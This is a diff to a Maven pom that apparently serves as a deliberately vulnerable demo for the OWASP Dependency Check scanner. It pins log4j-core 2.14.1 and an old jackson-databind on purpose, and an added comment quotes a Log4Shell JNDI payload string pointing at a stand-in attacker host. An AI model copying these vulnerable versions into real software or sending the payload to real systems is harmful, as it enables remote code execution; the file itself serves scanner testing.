@@ -10,9 +10,8 @@
     the OWASP Dependency Check plugin finding real CVEs.
 
     Known vulnerabilities in this pom:
-      • log4j-core 2.0       — CVE-2021-44228 (Log4Shell, CVSS 10.0), CVE-2021-45046
+      • log4j-core 2.14.1    — CVE-2021-44228 (Log4Shell, CVSS 10.0), CVE-2021-45046
       • jackson-databind 2.9.10 — multiple CVEs (deserialization, 2019–2020)
-      • spring-security-core 5.2.0 — CVE-2022-22978 and others
 
     DO NOT use these versions in a real project.
 	-->
@@ -47,21 +46,21 @@
 
 		<!--
 			⚠️  Log4Shell — CVE-2021-44228 (CVSS 10.0)
-			Any application that logs user-controlled input is vulnerable to RCE.
-			Do not remove or upgrade. Used for demo.
+			Version 2.14.1 is the last version BEFORE the fix.
+			Any application that logs user-controlled input is vulnerable to RCE
+			via JNDI lookup strings like ${jndi:ldap://attacker.com/exploit}.
 		-->
 		<dependency>
 			<groupId>org.apache.logging.log4j</groupId>
 			<artifactId>log4j-core</artifactId>
-			<!-- Intentionally old for demo purpose -->
-			<version>2.0</version>
-			<scope>compile</scope>
+			<version>2.14.1</version>
 		</dependency>
 
 		<!--
 			⚠️  Jackson Databind — multiple deserialization CVEs (2019-2021)
 			CVE-2019-14379, CVE-2019-14439, CVE-2020-24616, CVE-2020-24750, etc.
-			Do not remove or upgrade. Used for demo.
+			With enableDefaultTyping(), an attacker can instantiate arbitrary classes
+			via crafted JSON payloads.
 		-->
 		<dependency>
 			<groupId>com.fasterxml.jackson.core</groupId>
